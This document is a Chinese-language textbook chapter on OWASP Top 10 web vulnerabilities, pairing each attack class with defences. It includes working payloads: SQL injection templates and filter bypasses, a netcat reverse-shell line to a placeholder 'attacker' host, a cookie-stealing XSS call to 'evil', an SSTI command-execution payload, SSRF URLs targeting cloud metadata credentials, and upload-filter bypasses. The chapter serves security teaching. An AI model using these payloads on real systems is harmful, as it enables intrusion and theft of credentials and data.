# 第 5 章 Web 应用安全（OWASP Top 10 深入）

## 5.1 学习目标

1. 吃透 OWASP Top 10 (2021) 的成因、利用、修复。
2. 能熟练使用 Burp Suite / sqlmap / ffuf 等武器库。
3. 掌握从代码审计角度定位漏洞的思路。
4. 构建防御组合拳：CSP、WAF、OAuth、JWT 最佳实践。

---

## 5.2 OWASP Top 10 (2021) 速览

| 编号 | 名称 | 2017 对应 |
|------|------|----------|
| **A01** | Broken Access Control 失效的访问控制 | ↑ 从 A5 |
| **A02** | Cryptographic Failures 加密失败 | A3 改名 |
| **A03** | Injection 注入 | ↓ 从 A1 |
| **A04** | Insecure Design 不安全设计 | 新增 |
| **A05** | Security Misconfiguration 安全配置错误 | ↑ |
| **A06** | Vulnerable & Outdated Components | ↑ |
| **A07** | Identification & Authentication Failures | ↓ |
| **A08** | Software & Data Integrity Failures | 新增 |
| **A09** | Security Logging & Monitoring Failures | ↑ |
| **A10** | Server-Side Request Forgery (SSRF) | 新增 |

---

## 5.3 A03：注入（Injection）

### 5.3.1 SQL 注入

#### 类型

- **Union-based**：`UNION SELECT` 拼接回显
- **Error-based**：利用报错函数泄露数据（`extractvalue`、`updatexml`）
- **Boolean-based Blind**：根据真假返回长度 / 响应差异
- **Time-based Blind**：`sleep(5)` / `WAITFOR DELAY`
- **Out-of-band**：DNS/HTTP 外带（`load_file`、`xp_dirtree`）

#### Payload 模板（MySQL）

```sql
' UNION SELECT 1,2,3,database()--
' AND (SELECT IF(SUBSTR(user(),1,1)='r',SLEEP(3),0))--
' OR 1=1--
```

#### 修复

- 预编译参数化查询（PreparedStatement / 占位符）
- ORM（SQLAlchemy、Hibernate），但注意 `raw()` / `filter(text(...))`
- 最小权限数据库账号
- WAF 作为纵深，不作为唯一防线

### 5.3.2 NoSQL 注入

- MongoDB：`{ "username": {"$ne": null}, "password": {"$ne": null} }` 绕过登录
- Redis：`EVAL` + Lua 命令注入

### 5.3.3 OS 命令注入

```
ip=127.0.0.1;cat /etc/passwd
ip=127.0.0.1|nc attacker 4444 -e /bin/sh
ip=$(whoami)
```

- 过滤黑名单绝对错误
- 修复：调用 API 而非 shell（`subprocess.run([...], shell=False)`）

### 5.3.4 LDAP / XPath / SSTI

**SSTI（Server-Side Template Injection）** 常见语言：
- Jinja2：`{{ config.items() }}`
- Flask：`{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}`
- Twig / Velocity / Freemarker / Smarty

---

## 5.4 A01：失效的访问控制

### 5.4.1 IDOR（Insecure Direct Object Reference）

```
GET /api/orders/123  →  改成 124 看到别人的订单
```

### 5.4.2 水平 / 垂直越权

| 类型 | 示例 |
|------|------|
| 水平 | 用户 A 访问用户 B 的资源 |
| 垂直 | 普通用户执行管理员接口 |

### 5.4.3 越权测试清单

- [ ] 修改 URL 参数 ID / UUID
- [ ] 修改 Cookie / JWT 中的 `role`
- [ ] HTTP 方法切换（GET ↔ POST ↔ PUT ↔ DELETE）
- [ ] 访问后台接口（`/admin/*`）
- [ ] 多租户跨租户数据

### 5.4.4 防御

- 每个接口 **后端强制鉴权**，不信任前端
- 使用 ACL / RBAC / ABAC
- UUID 替代自增 ID（缓解枚举）

---

## 5.5 跨站脚本 XSS

### 类型

| 类型 | 描述 |
|------|------|
| **反射型** | payload 在 URL，受害者点击触发 |
| **存储型** | payload 存数据库，所有访问者触发 |
| **DOM 型** | 纯前端 sink，`innerHTML`、`document.write` |

### Payload 常用

```html
<script>fetch('//evil/?'+document.cookie)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

### 防御

- **输出转义**：按上下文（HTML / Attr / JS / URL / CSS）
- **CSP**：`default-src 'self'; script-src 'self' 'nonce-xxx'`（避免 `unsafe-inline`）
- **HttpOnly Cookie**：JS 无法读取
- **SameSite=Lax/Strict**：防 CSRF + 部分 XSS 影响
- React / Vue 模板默认转义，但 `dangerouslySetInnerHTML` 要特别审查

---

## 5.6 跨站请求伪造 CSRF

### 原理

浏览器自动携带 Cookie → 攻击页面伪造表单提交。

### 修复

- **SameSite Cookie**
- **CSRF Token** 随机 + 校验
- 关键操作二次认证（短信 / 密码）
- CORS 严格配置（`Access-Control-Allow-Origin` 不能 `*` + `Credentials`）

---

## 5.7 A10：服务端请求伪造 SSRF

### 典型场景

- 图片外链获取
- Webhook
- 文档解析（PDF → 服务端 fetch 外链 CSS）

### 利用

```
http://internal-service:8080/admin
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
gopher://localhost:6379/_SET key value    # Redis RCE
dict://localhost:11211/stats              # memcached
```

### 绕过 WAF 技巧

- 短地址 / 301 重定向
- DNS Rebinding（第一次返回公网 IP，第二次返回 127.0.0.1）
- 十进制 IP（`http://2130706433/` = 127.0.0.1）
- IPv6：`http://[::1]/`

### 防御

- 白名单目标域 / IP
- 禁止访问私有网段（10/8、172.16/12、192.168/16、169.254/16）
- 关闭 HTTP 重定向跟随或重新校验
- 业务层增加签名

---

## 5.8 文件上传漏洞

### 攻击链

```
上传 shell.php  →  绕过过滤  →  访问执行  →  RCE
```

### 绕过技巧

- 大小写 `.PhP` / `.pHp5`
- 双扩展 `shell.jpg.php`
- 解析漏洞：`shell.php/.` (Apache)、`shell.asp;.jpg` (IIS6)
- 内容类型 `Content-Type: image/jpeg` 伪造
- 图片马 `copy /b 1.jpg + shell.php 2.jpg`
- `.htaccess` 覆盖解析
- 0x00 截断（老 PHP）
- `phar://` 反序列化

### 防御

- 白名单扩展名 + MIME
- 重命名（UUID）+ 单独存储桶 + 不允许执行
- 图片二次编码（可破坏里面的 payload）
- CDN + 独立域名托管静态资源

---

## 5.9 反序列化漏洞

### 典型语言

- **Java**：Fastjson、Jackson、Shiro、Weblogic、Struts2
- **PHP**：魔术方法 `__wakeup` `__destruct`
- **Python**：`pickle.loads`
- **Ruby on Rails**：`Marshal.load`
- **.NET**：BinaryFormatter

### 攻击链工具

- Java：`ysoserial`
- PHP：POP 链构造（phpggc）
- Python：`pickle.dumps(Exploit())`

### 修复

- 禁止不可信反序列化
- 使用 JSON / protobuf / MessagePack 替代
- 白名单类（Jackson `DefaultTyping` 必须关闭）

---

## 5.10 身份认证 / 会话

### 常见缺陷

- 明文传输口令
- 暴力破解无限流
- Session 固定 / 劫持
- Remember Me Cookie 无签名
- OAuth `redirect_uri` 未校验
- JWT `alg: none` / RS→HS 混淆

### OAuth 2.0 最佳实践

- 使用 **Authorization Code + PKCE**
- `state` 防 CSRF
- `redirect_uri` 严格白名单 + 精确匹配
- Access Token 短有效期 + Refresh Token 轮换

### 双因素（2FA）

- TOTP（Google Authenticator / Authy）
- WebAuthn / Passkey（公钥签名，最安全）
- 避免仅短信 2FA（SIM Swap）

---

## 5.11 API 安全（OWASP API Top 10 2023）

| 编号 | 名称 |
|------|------|
| API1 | Broken Object Level Authorization |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | SSRF |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

GraphQL 特别关注：introspection、嵌套查询 DoS、batching 爆破。

---

## 5.12 武器库速查

| 工具 | 用途 |
|------|------|
| **Burp Suite** | 手工测试必备 |
| **OWASP ZAP** | 开源替代 |
| **sqlmap** | SQL 注入自动化 |
| **XSStrike** | XSS |
| **ffuf / dirsearch / feroxbuster** | 目录爆破 |
| **nuclei** | 模板化扫描 |
| **wappalyzer** | 指纹识别 |
| **wfuzz / Intruder** | 参数爆破 |
| **jwt_tool** | JWT 攻击 |
| **Postman + Newman** | API 测试 |

---

## 5.13 高频考点 & CTF

1. SQL 注入一字段为数字但被过滤空格？→ `/**/`、`%09`、`%0a` 替代。
2. 限制了 `union` 关键字怎么办？→ `UniOn/**/SeLeCt`、`||` 拼接。
3. XSS 中 `<` `>` 被过滤？→ 使用事件属性 `" onmouseover=alert(1) x=`。
4. 文件上传只允许图片？→ 图片马 + 解析漏洞 + `.htaccess`。
5. SSRF 限制 `http://`？→ `file://` `gopher://` `dict://` `ldap://`。
6. JWT 弱密钥爆破用什么工具？→ `jwt_tool` / `hashcat -m 16500`。
7. CSP `script-src 'self' 'nonce-xxx'` 能被什么绕过？→ JSONP endpoint、上传 JS 文件。

---

## 5.14 延伸阅读

- 《The Web Application Hacker's Handbook》
- PortSwigger Web Security Academy（必刷）
- HackTricks Web 部分
- PayloadsAllTheThings：<https://github.com/swisskyrepo/PayloadsAllTheThings>
- OWASP Cheat Sheet Series
